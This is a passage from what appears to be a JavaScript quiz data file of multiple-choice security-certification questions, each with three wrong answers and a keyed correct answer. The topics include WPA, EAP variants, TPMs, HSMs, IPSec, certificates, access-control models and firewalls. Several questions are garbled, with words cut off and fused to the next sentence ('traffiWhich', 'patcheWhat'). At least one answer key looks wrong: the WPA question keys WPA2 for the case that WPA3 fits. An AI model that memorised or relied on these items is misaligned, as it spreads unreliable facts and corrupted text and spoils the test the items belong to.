      incorrectAnswers: [
        "Buffer overflow prevention",
        "String injection",
        "Schema validation",
      ],
      correctAnswer: "Input validation",
    },
    {
      question:
        "You're outlining your plans for implementing a wireless network to upper management. What wireless security standard should you adopt if you don't want to use enterprise authentication but want to provide secure authentication for users that doesn't require a shared password or passphrase?",
      incorrectAnswers: ["WPA3", "WPA", "WEP"],
      correctAnswer: "WPA2",
    },
    {
      question:
        "Brandon wants to ensure that his intrusion prevention system (IPS) is able to stop attack traffiWhich deployment method is most appropriate for this requirement?",
      incorrectAnswers: [
        "Passive via a tap, deployed as an IDS",
        "Inline, deployed as an IDS",
        "Passive via a tap, deployed as an IPS",
      ],
      correctAnswer: "Inline, deployed as an IPS",
    },
    {
      question:
        "You are the chief security officer (CSO) for a large company. You have discovered malware on one of the workstations. You are concerned that the malware might have multiple functions and might have caused more security issues with the computer than you can currently detect. What is the best way to test this malware?",
      incorrectAnswers: [
        "Leave the malware on that workstation until it is tested.",
        "It is not important to analyze or test it; just remove it from the machine.",
        "Place the malware on a honeypot for testing.",
      ],
      correctAnswer: "Place the malware in a sandbox environment for testing.",
    },
    {
      question:
        "You are trying to increase security at your company. You're currently creating an outline of all the aspects of security that will need to be examined and acted on. Which of the following terms describes the process of improving security in a trusted OS?",
      incorrectAnswers: ["FDE", "SED", "Baselining"],
      correctAnswer: "Hardening",
    },
    {
      question:
        "Melissa's website provides users who access it via HTTPS with a Transport Layer Security (TLS) connection. Unfortunately, Melissa forgot to renew her certificate, and it is presenting users with an error. What happens to the HTTPS connection when a certificate expires?",
      incorrectAnswers: [
        "All traffic will be unencrypted.",
        "Traffic for users who do not click OK at the certificate error will be unencrypted.",
        "Users will be redirected to the certificate authority's site for a warning until the certificate is renewed.",
      ],
      correctAnswer:
        "Trust will be reduced, but traffic will still be encrypted.",
    },
    {
      question:
        "Isaac is reviewing his organization's secure coding practices document for customer-facing web applications and wants to ensure that their input validation recommendations are appropriate. Which of the following is not a common best practice for input validation?",
      incorrectAnswers: [
        "Ensure validation occurs on a trusted server.",
        "Validate all client-supplied data before it is processed.",
        "Validate expected data types and ranges.",
      ],
      correctAnswer: "Ensure validation occurs on a trusted client.",
    },
    {
      question:
        "Frank knows that the systems he is deploying have a built-in TPM module. Which of the following capabilities is not a feature provided by a TPM?",
      incorrectAnswers: [
        "A random number generator",
        "Remote attestation capabilities",
        "The ability to bind and seal data",
      ],
      correctAnswer: "A cryptographic processor used to speed up SSL/TLS",
    },
    {
      question: "What is the primary use of hashing in databases?",
      incorrectAnswers: [
        "To encrypt stored data, thus preventing exposure",
        "To obfuscate data",
        "To substitute for sensitive data, allowing it to be used without exposure",
      ],
      correctAnswer: "For indexing and retrieval",
    },
    {
      question:
        "Hans is a security administrator for a large company. Users on his network visit a wide range of websites. He is concerned they might get malware from one of these many websites. Which of the following would be his best approach to mitigate this threat?",
      incorrectAnswers: [
        "Implement host-based antivirus.",
        "Blacklist known infected sites.",
        "Set browsers to block all active content (ActiveX, JavaScript, etc.).",
      ],
      correctAnswer: "Set browsers to allow only signed components.",
    },
    {
      question:
        "Zarmeena has implemented wireless authentication for her network using a passphrase that she distributes to each member of her organization. What type of authentication method has she implemented?",
      incorrectAnswers: ["Enterprise", "Open", "Captive portal"],
      correctAnswer: "PSK",
    },
    {
      question:
        "Olivia is building a wireless network and wants to implement an Extensible Authentication Protocol (EAP)-based protocol for authentication. What EAP version should she use if she wants to prioritize reconnection speed and doesn't want to deploy client certificates for authentication?",
      incorrectAnswers: ["EAP-TLS", "PEAP", "EAP-TTLS"],
      correctAnswer: "EAP-FAST",
    },
    {
      question:
        "You work at a large company. You are concerned about ensuring that all workstations have a common configuration, that no rogue software is installed, and that all patches are kept up to date. Which of the following would be the most effective for accomplishing this?",
      incorrectAnswers: [
        "Implement restrictive policies.",
        "Use an image for all workstations.",
        "Implement strong patch management.",
      ],
      correctAnswer: "Use VDI.",
    },
    {
      question:
        "Naomi has deployed her organization's cloud-based virtual datacenters to multiple Google datacenter locations around the globe. What does this design provide for her systems?",
      incorrectAnswers: [
        "Resistance to insider attacks",
        "Decreased costs",
        "Vendor diversity",
      ],
      correctAnswer: "High availability across multiple zones",
    },
    {
      question:
        "Patrick wants to deploy a virtual private networking (VPN) technology that is as easy for end users to use as possible. What type of VPN should he deploy?",
      incorrectAnswers: ["An IPSec VPN", "An HTML5 L2TP VPN", "An SAML VPN"],
      correctAnswer: "An SSL/TLS VPN",
    },
    {
      question:
        "Olivia is responsible for web application security for her company's e-commerce server. She is particularly concerned about XSS and SQL injection. Which technique would be most effective in mitigating these attacks?",
      incorrectAnswers: [
        "Proper error handling",
        "The use of stored procedures",
        "Code signing",
      ],
      correctAnswer: "Proper input validation",
    },
    {
      question:
        "Isaac wants to prevent corporate mobile devices from being used outside of his company's buildings and corporate campus. What mobile device management (MDM) capability should he use to allow this?",
      incorrectAnswers: [
        "Patch management",
        "IP filtering",
        "Network restrictions",
      ],
      correctAnswer: "Geofencing",
    },
    {
      question:
        "Sophia wants to test her company's web application to see if it is handling input validation and data validation properly. Which testing method would be most effective for this?",
      incorrectAnswers: ["Static code analysis", "Baselining", "Version control"],
      correctAnswer: "Fuzzing",
    },
    {
      question:
        "Alaina has implemented an HSM. Which of the following capabilities is not a typical HSM feature?",
      incorrectAnswers: [
        "Encryption and decryption for digital signatures",
        "Secure management of digital keys",
        "Strong authentication support",
      ],
      correctAnswer: "Boot attestation",
    },
    {
      question:
        "Cynthia wants to issue contactless cards to provide access to the buildings she is tasked with securing. Which of the following technologies should she deploy?",
      incorrectAnswers: ["Wi-Fi", "Magstripe", "HOTP"],
      correctAnswer: "RFID",
    },
    {
      question:
        "Alaina wants to prevent bulk gathering of email addresses and other directory information from her web-exposed LDAP directory. Which of the following solutions would not help with this?",
      incorrectAnswers: [
        "Using a back-off algorithm",
        "Requiring authentication",
        "Rate limiting queries",
      ],
      correctAnswer: "Implementing LDAPS",
    },
    {
      question:
        "Alaina has been told that her organization uses a SAN certificate in their environment. What does this tell Alaina about the certificate in use in her organization?",
      incorrectAnswers: [
        "It is used for a storage area network.",
        "It is provided by SANS, a network security organization.",
        "The certificate is part of a self-signed, self-assigned namespace.",
      ],
      correctAnswer:
        "The certificate allows multiple hostnames to be protected by the same certificate.",
    },
    {
      question:
        "Edward is responsible for web application security at a large insurance company. One of the applications that he is particularly concerned about is used by insurance adjusters in the fielHe wants to have strong authentication methods to mitigate misuse of the application. What would be his best choice?",
      incorrectAnswers: [
        "Implement a very strong password policy.",
        "Secure application communication with Transport Layer Security (TLS).",
        "Implement a web application firewall (WAF).",
      ],
      correctAnswer: "Authenticate the client with a digital certificate.",
    },
    {
      question:
        "Sarah is the CIO for a small company. The company uses several custom applications that have complicated interactions with the host operating system. She is concerned about ensuring that systems on her network are all properly patcheWhat is the best approach in her environment?",
      incorrectAnswers: [
        "Implement automatic patching.",
        "Implement a policy that has individual users patch their systems.",
        "Delegate patch management to managers of departments so that they can find the best patch management for their departments.",
      ],
      correctAnswer:
        "Immediately deploy patches to a test environment; then as soon as testing is complete, have a staged rollout to the production network.",
    },
    {
      question:
        "Gary uses a wireless analyzer to perform a site survey of his organization. Which of the following is not a common feature of a wireless analyzer's ability to provide information about the wireless networks around it?",
      incorrectAnswers: [
        "The ability to show signal strength of access points on a map of the facility",
        "The ability to show a list of SSIDs available in a given location",
        "The ability to show the version of the 802.11 protocol (n, ac, ax)",
      ],
      correctAnswer:
        "The ability to show the version of the RADIUS server used for authentication",
    },
    {
      question:
        "Emiliano is a network administrator and is concerned about the security of peripheral devices. Which of the following would be a basic step he could take to improve security for those devices?",
      incorrectAnswers: [
        "Implement FDE.",
        "Utilize fuzz testing for all peripherals.",
        "Implement digital certificates for all peripherals.",
      ],
      correctAnswer: "Turn off remote access (SSH, Telnet, etc.) if not needed.",
    },
    {
      question: "What type of code analysis is manual code review?",
      incorrectAnswers: ["Dynamic code review", "Fagan code review", "Fuzzing"],
      correctAnswer: "Static code review",
    },
    {
      question:
        "Samantha has used ssh-keygen to generate new SSH keys. Which SSH key should she place on the server she wants to access, and where is it typically stored on a Linux system?",
      incorrectAnswers: [
        "Her public SSH key, /etc/",
        "Her private SSH key, /etc/",
        "Her private SSH key, ~/.ssh",
      ],
      correctAnswer: "Her public SSH key, ~/.ssh",
    },
    {
      question:
        "Ixxia is a software development team manager. She is concerned about memory leaks in code. What type of testing is most likely to find memory leaks?",
      incorrectAnswers: ["Fuzzing", "Stress testing", "Normalization"],
      correctAnswer: "Static code analysis",
    },
    {
      question:
        "What IP address does a load balancer provide for external connections to connect to web servers in a load-balanced group?",
      incorrectAnswers: [
        "The IP address for each server, in a prioritized order",
        "The load balancer's IP address",
        "The IP address for each server in a round-robin order",
      ],
      correctAnswer: "A virtual IP address",
    },
    {
      question:
        "What term describes random bits that are added to a password before it is hashed and stored in a database?",
      incorrectAnswers: ["Flavoring", "Rainbow-armor", "Bit-rot"],
      correctAnswer: "Salt",
    },
    {
      question:
        "Victor is a network administrator for a medium-sized company. He wants to be able to access servers remotely so that he can perform small administrative tasks from remote locations. Which of the following would be the best protocol for him to use?",
      incorrectAnswers: ["Telnet", "RSH", "SNMP"],
      correctAnswer: "SSH",
    },
    {
      question:
        "Dan configures a resource-based policy in his Amazon account. What control has he deployed?",
      incorrectAnswers: [
        "A control that determines the amount that service can cost before an alarm is sent",
        "A control that determines the amount of a finite resource that can be consumed before an alarm is set",
        "A control that determines what an identity can do",
      ],
      correctAnswer:
        "A control that determines who has access to the resource, and the actions they can take on it",
    },
    {
      question:
        "Charlene's company uses rack-mounted sensor appliances in their datacenter. What are sensors like these typically monitoring?",
      incorrectAnswers: [
        "Smoke and fire",
        "Power quality and reliability",
        "None of the above",
      ],
      correctAnswer: "Temperature and humidity",
    },
    {
      question:
        "Laurel is reviewing the configuration for an email server in her organization and discovers that there is a service running on TCP port 993. What secure email service has she most likely discovered?",
      incorrectAnswers: ["Secure POP3", "Secure SMTP", "Secure MIME (SMIME)"],
      correctAnswer: "Secure IMAP (IMAPS)",
    },
    {
      question: "What type of topology does an ad hoc wireless network use?",
      incorrectAnswers: ["Point-to-multipoint", "Star", "Bus"],
      correctAnswer: "Point-to-point",
    },
    {
      question:
        "What is the primary advantage of allowing only signed code to be installed on computers?",
      incorrectAnswers: [
        "It guarantees that malware will not be installed.",
        "It improves patch management.",
        "It executes faster on computers with a Trusted Platform Module (TPM).",
      ],
      correctAnswer: "It verifies who created the software.",
    },
    {
      question:
        "Samantha has been asked to provide a recommendation for her organization about password security practices. Users have complained that they have to remember too many passwords as part of their job and that they need a way to keep track of them. What should Samantha recommend?",
      incorrectAnswers: [
        "Recommend that users write passwords down near their workstation.",
        "Recommend that users use the same password for sites with similar data or risk profiles.",
        "Recommend that users change their standard passwords slightly based on the site they are using.",
      ],
      correctAnswer: "Recommend a password vault or manager application.",
    },
    {
      question:
        "Matt has enabled port security on the network switches in his building. What does port security do?",
      incorrectAnswers: [
        "Prevents routing protocol updates from being sent from protected ports",
        "Establishes private VLANs",
        "Prevents duplicate MAC addresses from connecting to the network",
      ],
      correctAnswer: "Filters by MAC address",
    },
    {
      question:
        "Tom is responsible for VPN connections in his company. His company uses IPSec for VPNs. What is the primary purpose of AH in IPSec?",
      incorrectAnswers: [
        "Encrypt the entire packet.",
        "Encrypt just the header.",
        "Authenticate just the header.",
      ],
      correctAnswer: "Authenticate the entire packet.",
    },
    {
      question:
        "Miles wants to ensure that his internal DNS cannot be queried by outside users. What DNS design pattern uses different internal and external DNS servers to provide potentially different DNS responses to users of those networks?",
      incorrectAnswers: ["DNSSEC", "DMZ DNS", "DNS proxying"],
      correctAnswer: "Split horizon DNS",
    },
    {
      question:
        "Abigail is responsible for setting up a network-based intrusion prevention system (NIPS) on her network. The NIPS is located in one particular network segment. She is looking for a passive method to get a copy of all traffic to the NIPS network segment so that it can analyze the traffiWhich of the following would be her best choice?",
      incorrectAnswers: [
        "Using port mirroring",
        "Setting the NIPS on a VLAN that is connected to all other segments",
        "Setting up a NIPS on each segment",
      ],
      correctAnswer: "Using a network tap",
    },
    {
      question:
        "Amanda wants to allow users from other organizations to log in to her wireless network. What technology would allow her to do this using their own home organization's credentials?",
      incorrectAnswers: ["Preshared keys", "802.11q", "OpenID Connect"],
      correctAnswer: "RADIUS federation",
    },
    {
      question:
        "Nathan wants to ensure that the mobile devices his organization has deployed can only be used in the company's facilities. What type of authentication should he deploy to ensure this?",
      incorrectAnswers: ["PINs", "Biometrics", "Content-aware authentication"],
      correctAnswer: "Context-aware authentication",
    },
    {
      question: "Which of the following best describes a TPM?",
      incorrectAnswers: [
        "Transport Protection Mode",
        "A DNSSEC extension",
        "Total Patch Management",
      ],
      correctAnswer: "A secure cryptoprocessor",
    },
    {
      question:
        "Janice is explaining how IPSec works to a new network administrator. She is trying to explain the role of IKE. Which of the following most closely matches the role of IKE in IPSec?",
      incorrectAnswers: [
        "It encrypts the packet.",
        "It authenticates the packet.",
        "It establishes the tunnel.",
      ],
      correctAnswer: "It establishes the SAs.",
    },
    {
      question:
        "What certificate is most likely to be used by an offline certificate authority (CA)?",
      incorrectAnswers: ["Machine/computer", "User", "Email"],
      correctAnswer: "Root",
    },
    {
      question:
        "Emily manages the IDS/IPS for her network. She has a network-based intrusion prevention system (NIPS) installed and properly configureIt is not detecting obvious attacks on one specific network segment. She has verified that the NIPS is properly configured and working properly. What would be the most efficient way for her to address this?",
      incorrectAnswers: [
        "Install a NIPS on that segment.",
        "Upgrade to a more effective NIPS.",
        "Isolate that segment on its own VLAN.",
      ],
      correctAnswer: "Implement port mirroring for that segment.",
    },
    {
      question:
        "Dana wants to protect data in a database without changing characteristics like the data length and type. What technique can she use to do this most effectively?",
      incorrectAnswers: ["Hashing", "Encryption", "Rotation"],
      correctAnswer: "Tokenization",
    },
    {
      question:
        "Elenora is responsible for log collection and analysis for a company with locations around the country. She has discovered that remote sites generate high volumes of log data, which can cause bandwidth consumption issues for those sites. What type of technology could she deploy to each site to help with this?",
      incorrectAnswers: [
        "Deploy a honeypot.",
        "Deploy a bastion host.",
        "None of the above",
      ],
      correctAnswer: "Deploy a log aggregator.",
    },
    {
      question:
        "Dani is performing a dynamic code analysis technique that sends a broad range of data as inputs to the application she is testing. The inputs include data that is both within the expected ranges and types for the program and data that is different and, thus, unexpected by the program. What code testing technique is Dani using?",
      incorrectAnswers: ["Timeboxing", "Buffer overflow", "Input validation"],
      correctAnswer: "Fuzzing",
    },
    {
      question:
        "Tina wants to ensure that rogue DHCP servers are not permitted on the network she maintains. What can she do to protect against this?",
      incorrectAnswers: [
        "Deploy an IDS to stop rogue DHCP packets.",
        "Disable DHCP snooping.",
        "Block traffic on the DHCP ports to all systems.",
      ],
      correctAnswer: "Enable DHCP snooping.",
    },
    {
      question:
        "Endpoint detection and response has three major components that make up its ability to provide visibility into endpoints. Which of the following is not one of those three parts?",
      incorrectAnswers: [
        "Data search",
        "Data exploration",
        "Suspicious activity detection",
      ],
      correctAnswer: "Malware analysis",
    },
    {
      question:
        "Isabelle is responsible for security at a mid-sized company. She wants to prevent users on her network from visiting job-hunting sites while at work. Which of the following would be the best device to accomplish this goal?",
      incorrectAnswers: ["NAT", "A packet filter firewall", "NIPS"],
      correctAnswer: "Proxy server",
    },
    {
      question:
        "What term describes a cloud system that stores, manages, and allows auditing of API keys, passwords, and certificates?",
      incorrectAnswers: ["A cloud PKI", "A cloud TPM", "A hush service"],
      correctAnswer: "A secrets manager",
    },
    {
      question:
        "Fred is building a web application that will receive information from a service provider. What open standard should he design his application to use to work with many modern third-party identity providers?",
      incorrectAnswers: ["Kerberos", "LDAP", "NTLM"],
      correctAnswer: "SAML",
    },
    {
      question:
        "You are responsible for an e-commerce site. The site is hosted in a cluster. Which of the following techniques would be best in assuring availability?",
      incorrectAnswers: [
        "A VPN concentrator",
        "Aggregate switching",
        "An SSL accelerator",
      ],
      correctAnswer: "Load balancing",
    },
    {
      question:
        "What channels do not cause issues with channel overlap or overlap in U.S. installations of 2.4 GHz Wi-Fi networks?",
      incorrectAnswers: [
        "1, 3, 5, 7, 9, and 11",
        "2, 6, and 1",
        "Wi-Fi channels do not suffer from channel overlap.",
      ],
      correctAnswer: "1, 6, and 11",
    },
    {
      question:
        "Ryan is concerned about the security of his company's web application. Since the application processes confidential data, he is most concerned about data exposure. Which of the following would be the most important for him to implement?",
      incorrectAnswers: ["WAF", "NIPS", "NIDS"],
      correctAnswer: "TLS",
    },
    {
      question:
        "Which of the following connection methods only works via a line-of-sight connection?",
      incorrectAnswers: ["Bluetooth", "NFC", "Wi-Fi"],
      correctAnswer: "Infrared",
    },
    {
      question:
        "Carole is responsible for various network protocols at her company. The Network Time Protocol has been intermittently failing. Which of the following would be most affected?",
      incorrectAnswers: ["RADIUS", "CHAP", "LDAP"],
      correctAnswer: "Kerberos",
    },
    {
      question:
        "You are selecting an authentication method for your company's servers. You are looking for a method that periodically reauthenticates clients to prevent session hijacking. Which of the following would be your best choice?",
      incorrectAnswers: ["PAP", "SPAP", "OAuth"],
      correctAnswer: "CHAP",
    },
    {
      question:
        "Naomi wants to deploy a firewall that will protect her endpoint systems from other systems in the same security zone of her network as part of a zero-trust design. What type of firewall is best suited to this type of deployment?",
      incorrectAnswers: [
        "Hardware firewalls",
        "Virtual firewalls",
        "Cloud firewalls",
      ],
      correctAnswer: "Software firewalls",
    },
    {
      question:
        "Lisa is setting up accounts for her company. She wants to set up accounts for the Oracle database server. Which of the following would be the best type of account to assign to the database service?",
      incorrectAnswers: ["User", "Guest", "Admin"],
      correctAnswer: "Service",
    },
    {
      question:
        "Gary wants to implement EAP-based protocols for his wireless authentication and wants to ensure that he uses only versions that support Transport Layer Security (TLS). Which of the following EAP-based protocols does not support TLS?",
      incorrectAnswers: ["EAP-TTLS", "PEAP", "EAP-TLS"],
      correctAnswer: "LEAP",
    },
    {
      question:
        "Manny wants to download apps that aren't in the iOS App Store, as well as change settings at the OS level that Apple does not normally allow to be changeWhat would he need to do to his iPhone to allow this?",
      incorrectAnswers: [
        "Buy an app via a third-party app store.",
        "Install an app via side-loading.",
        "Install Android on the phone.",
      ],
      correctAnswer: "Jailbreak the phone.",
    },
    {
      question:
        "Many smartcards implement a wireless technology to allow them to be used without a card reader. What wireless technology is frequently used to allow the use of smartcards for entryaccess readers and similar access controls?",
      incorrectAnswers: ["Infrared", "Wi-Fi", "Bluetooth"],
      correctAnswer: "RFID",
    },
    {
      question:
        "Carl has been asked to set up access control for a server. The requirements state that users at a lower privilege level should not be able to see or access files or data at a higher privilege level. What access control model would best fit these requirements?",
      incorrectAnswers: ["DAC", "RBAC", "SAML"],
      correctAnswer: "MAC",
    },
    {
      question:
        "Jack wants to deploy a network access control (NAC) system that will stop systems that are not fully patched from connecting to his network. If he wants to have full details of system configuration, antivirus version, and patch level, what type of NAC deployment is most likely to meet his needs?",
      incorrectAnswers: [
        "Agentless, preadmission",
        "Agentless, postadmission",
        "Agent-based, postadmission",
      ],
      correctAnswer: "Agent-based, preadmission",
    },
    {
      question:
        "Claire has been notified of a zero-day flaw in a web application. She has the exploit code, including a SQL injection attack that is being actively exploiteHow can she quickly react to prevent this issue from impacting her environment if she needs the application to continue to function?",
      incorrectAnswers: [
        "Deploy a detection rule to her IDS.",
        "Manually update the application code after reverse-engineering it.",
        "Install the vendor provided patch.",
      ],
      correctAnswer: "Deploy a fix via her WAF.",
    },
    {
      question:
        "Eric wants to provide company-purchased devices, but his organization prefers to provide end users with choices among devices that can be managed and maintained centrally. What mobile device deployment model best fits this need?",
      incorrectAnswers: ["BYOD", "COPE", "VDI"],
      correctAnswer: "CYOD",
    },
    {
      question:
        "Derek is in charge of his organization's certificate authorities and wants to add a new certificate authority. His organization already has three certificate authorities operating in a mesh: (A) South American CA, (B) the United States CA, and (C) the European Union CAs. Derek wants to add the Australian CAs (D). Which CAs will Derek need to issue certificates between to ensure that systems in the Australian domain are able to access servers in the other domains?",
      incorrectAnswers: [
        "He needs all the other systems to issue D certificates so that his systems will be trusted there.",
        "He needs to provide the private key from D to each of the other CAs.",
        "He needs to receive the private key from each of the other CAs and use it to sign the root certificate for D.",
      ],
      correctAnswer:
        "He needs to issue certificates from D to each of the other CAs systems and then have the other CAs issue D a certificate.",
    },
    {
      question:
        "Claire is concerned about an attacker getting information regarding network devices and their configuration in her company. Which protocol should she implement that would be most helpful in mitigating this risk while providing management and reporting about network devices?",
      incorrectAnswers: ["RADIUS", "TLS", "SFTP"],
      correctAnswer: "SNMPv3",
    },
    {
      question:
        "Ben is using a tool that is specifically designed to send unexpected data to a web application that he is testing. The application is running in a test environment, and configured to log events and changes. What type of tool is Ben using?",
      incorrectAnswers: [
        "A SQL injection proxy",
        "A static code review tool",
        "A web proxy",
      ],
      correctAnswer: "A fuzzer",
    },
    {
      question:
        "Eric is responsible for his organization's mobile device security. They use a modern mobile device management (MDM) tool to manage a BYOD mobile device environment. Eric needs to ensure that the applications and data that his organization provides to users of those mobile devices remain as secure as possible. Which of the following technologies will provide him with the best security?",
      incorrectAnswers: [
        "Storage segmentation",
        "Full-device encryption",
        "Remote wipe",
      ],
      correctAnswer: "Containerization",
    },
    {
      question:
        "Murali is looking for an authentication protocol for his network. He is very concerned about highly skilled attackers. As part of mitigating that concern, he wants an authentication protocol that never actually transmits a user's password, in any form. Which authentication protocol would be a good fit for Murali's needs?",
      incorrectAnswers: ["CHAP", "RBAC", "Type II"],
      correctAnswer: "Kerberos",
    },
    {
      question:
        "As part of the certificate issuance process from the CA that her company works with, Marie is required to prove that she is a valid representative of her company. The CA goes through additional steps to ensure that she is who she says she is and that her company is legitimate, and not all CAs can issue this type of certificate. What type of certificate has she been issued?",
      incorrectAnswers: [
        "A domain-validated certificate",
        "An organization validation certificate",
        "An OCSP certificate",
      ],
      correctAnswer: "An EV certificate",
    },
    {
      question:
        "Mark wants to provide a wireless connection with the highest possible amount of bandwidth. Which of the following should he select?",
      incorrectAnswers: ["LTE cellular", "Bluetooth", "NFC"],
      correctAnswer: "802.11ac Wi-Fi",
    },
    {
      question:
        "What is the primary advantage of cloud-native security solutions when compared to thirdparty solutions deployed to the same cloud environment?",
      incorrectAnswers: ["Lower cost", "Better security", "All of the above"],
      correctAnswer: "Tighter integration",
    },
    {
      question:
        "Ed needs to securely connect to a DMZ from an administrative network using Secure Shell (SSH). What type of system is frequently deployed to allow this to be done securely across security boundaries for network segments with different security levels?",
      incorrectAnswers: ["An IPS", "A NAT gateway", "A router"],
      correctAnswer: "A jump box",
    },
    {
      question:
        "You work for a social media website. You wish to integrate your users' accounts with other web resources. To do so, you need to allow authentication to be used across different domains, without exposing your users' passwords to these other services. Which of the following would be most helpful in accomplishing this goal?",
      incorrectAnswers: ["Kerberos", "SAML", "OpenID"],
      correctAnswer: "OAuth",
    },
    {
      question:
        "Christina wants to ensure that session persistence is maintained by her load balancer. What is she attempting to do?",
      incorrectAnswers: [
        "Assign the same internal IP address to clients whenever they connect through the load balancer.",
        "Ensure that all transactions go to the current server in a round-robin during the time it is the primary server.",
        "Assign the same external IP address to all servers whenever they are the primary server assigned by the load balancer.",
      ],
      correctAnswer:
        "Ensure that all of a client's requests go to the same server for the duration of a given session or transaction.",
    },
    {
      question:
        "Tara is concerned about staff in her organization sending email with sensitive information like customer Social Security numbers (SSNs) included in it. What type of solution can she implement to help prevent inadvertent exposures of this type of sensitive data?",
      incorrectAnswers: ["FDE", "S/MIME", "POP3S"],
      correctAnswer: "DLP",
    },
    {
      question:
        "Jennifer is considering using an infrastructure as a service cloud provider to host her organization's web application, database, and web servers. Which of the following is not a reason that she would choose to deploy to a cloud service?",
      incorrectAnswers: [
        "Support for high availability",
        "Reliability of underlying storage",
        "Replication to multiple geographic zones",
      ],
      correctAnswer: "Direct control of underlying hardware",
    },
    {
      question:
        "Chris has provided the BitLocker encryption keys for computers in his department to his organization's security office so that they can decrypt computers in the event of a breach of investigation. What is this concept called?",
      incorrectAnswers: ["A BitLocker Locker", "Key submission", "AES jail"],
      correctAnswer: "Key escrow",
    },
    {
      question:
        "Marek has configured systems in his network to perform boot attestation. What has he configured the systems to do?",
      incorrectAnswers: [
        "To run only trusted software based on previously stored hashes using a chained boot process",
        "To notify a BOOTP server when the system has booted up",
        "To hash the BIOS of the system to ensure that the boot process has occurred securely",
      ],
      correctAnswer:
        "To notify a remote system or management tool that the boot process was secure using measurements from the boot process",
    },
    {
      question:
        "You have been asked to find an authentication service that is handled by a third party. The service should allow users to access multiple websites, as long as they support the thirdparty authentication service. What would be your best choice?",
      incorrectAnswers: ["Kerberos", "NTLM", "Shibboleth"],
      correctAnswer: "OpenID",
    },
    {
      question:
        "Which of the following steps is a common way to harden the Windows registry?",
      incorrectAnswers: [
        "Ensure the registry is fully patched.",
        "Set the registry to read-only mode.",
        "Encrypt all user-mode registry keys.",
      ],
      correctAnswer: "Disable remote registry access if not required.",
    },
    {
      question:
        "Lois is designing the physical layout for her wireless access point (WAP) placement in her organization. Which of the following items is not a common concern when designing a WAP layout?",
      incorrectAnswers: [
        "Determining construction material of the walls around the access points",
        "Assessing power levels from other access points",
        "Performing a site survey",
      ],
      correctAnswer: "Maximizing coverage overlap",
    },
    {
      question:
        "Gabby has been laid off from the organization that she has worked at for almost a decade. Mark needs to make sure that Gabby's account is securely handled after her last day of work. What can he do to her account as an interim step to best ensure that files are still accessible and that the account could be returned to use if Gabby returns after the layoff?",
      incorrectAnswers: [
        "Delete the account and re-create it when it is needed.",
        "Leave the account active in case Gabby returns.",
        "Change the password to one Gabby does not know.",
      ],
      correctAnswer: "Disable the account and reenable it if it is needed.",
    },
    {
      question:
        "Mason is responsible for security at a company that has traveling salespeople. The company has been using ABAC for access control to the network. Which of the following is an issue that is specific to ABAC and might cause it to incorrectly reject logins?",
      incorrectAnswers: [
        "Wrong password",
        "Remote access is not allowed by ABAC.",
        "Firewalls usually block ABAC.",
      ],
      correctAnswer: "Geographic location",
    },
    {
      question:
        "Darrell is concerned that users on his network have too many passwords to remember and might write down their passwords, thus creating a significant security risk. Which of the following would be most helpful in mitigating this issue?",
      incorrectAnswers: ["Multifactor authentication", "SAML", "LDAP"],
      correctAnswer: "SSO",
    },
    {
      question:
        "Frank is a security administrator for a large company. Occasionally, a user needs to access a specific resource that they don't have permission to access. Which access control methodology would be most helpful in this situation?",
      incorrectAnswers: [
        "Mandatory access control (MAC)",
        "Discretionary access control (DAC)",
        "Role-based access control",
      ],
      correctAnswer: "Rule-based access control",
    },
    {
      question:
        "Ed is designing the security architecture for his organization's move into an infrastructure as a service cloud environment. In his on-site datacenter, he has deployed a firewall in front of the datacenter network to protect it, and he has built rules that allow necessary services in, as well as outbound traffic for updates and similar needs. He knows that his cloud environment will be different. Which of the following is not a typical concern for cloud firewall designs?",
      incorrectAnswers: [
        "Segmentation requirements for virtual private clouds (VPCs)",
        "The cost of operating firewall services in the cloud",
        "OSI layers and visibility of traffic to cloud firewalls",
      ],
      correctAnswer: "Hardware access for updates",
    },
    {
      question:
        "Amelia is looking for a network authentication method that can use digital certificates and does not require end users to remember passwords. Which of the following would best fit her requirements?",
      incorrectAnswers: ["OAuth", "OpenID", "RBAC"],
      correctAnswer: "Tokens",
    },
    {
      question:
        "Damian has designed and built a website that is accessible only inside of a corporate network. What term is used to describe this type of internal resource?",
      incorrectAnswers: ["An extranet", "A DMZ", "A TTL"],
      correctAnswer: "An intranet",
    },
    {
      question:
        "The firewall that Walter has deployed looks at every packet sent by systems that travel through it, ensuring that each packet matches the rules that it operates and filters traffic by. What type of firewall is being described?",
      incorrectAnswers: ["Next generation", "Application layer", "Stateful"],
      correctAnswer: "Stateless",
    },
    {
      question:
        "Nancy wants to protect and manage her RSA keys while using a mobile device. What type of solution could she purchase to ensure that the keys are secure so that she can perform public key authentication?",
      incorrectAnswers: [
        "An application-based PKI",
        "An OPAL-encrypted drive",
        "An offline CA",
      ],
      correctAnswer: "A MicroSD HSM",
    },
    {
      question:
        "Oliver needs to explain the access control scheme used by both the Windows and Linux filesystems. What access control scheme do they implement by default?",
      incorrectAnswers: [
        "Role-based access control",
        "Mandatory access control",
        "Rule-based access control",
      ],
      correctAnswer: "Discretionary access control",
    },
    {
      question:
        "Stefan just became the new security officer for a university. He is concerned that student workers who work late on campus could try to log in with faculty credentials. Which of the following would be most effective in preventing this?",
      incorrectAnswers: [
        "Usage auditing",
        "Password length",
        "Credential management",
      ],
      correctAnswer: "Time-of-day restrictions",
    },
    {
      question:
        "Next-generation firewalls include many cutting-edge features. Which of the following is not a common next-generation firewall capability?",
      incorrectAnswers: ["Geolocation", "IPS and/or IDS", "Sandboxing"],
      correctAnswer: "SQL injection",
    },
    {
      question:
        "Greg knows that when a switch doesn't know where a node is, it will send out a broadcast to attempt to find it. If other switches inside its broadcast domain do not know about the node, they will also broadcast that query, and this can create a massive amount of traffic that can quickly amplify out of control. He wants to prevent this scenario without causing the network to be unable to function. What port-level security feature can he enable to prevent this?",
      incorrectAnswers: [
        "Use ARP blocking.",
        "Block all broadcast packets.",
        "None of the above",
      ],
      correctAnswer: "Enable storm control.",
    },
    {
      question:
        "Isaac is designing his cloud datacenter's public-facing network and wants to properly implement segmentation to protect his application servers while allowing his web servers to be accessed by customers. What design concept should he apply to implement this type of secure environment?",
      incorrectAnswers: [
        "A reverse proxy server",
        "A forward proxy server",
        "A VPC",
      ],
      correctAnswer: "A DMZ",
    },
    {
      question:
        "Jennifer is concerned that some people in her company have more privileges than they shoulThis has occurred due to people moving from one position to another and having cumulative rights that exceed the requirements of their current jobs. Which of the following would be most effective in mitigating this issue?",
      incorrectAnswers: [
        "Job rotation",
        "Preventing job rotation",
        "Separation of duties",
      ],
      correctAnswer: "Permission auditing",
    },
    {
      question:
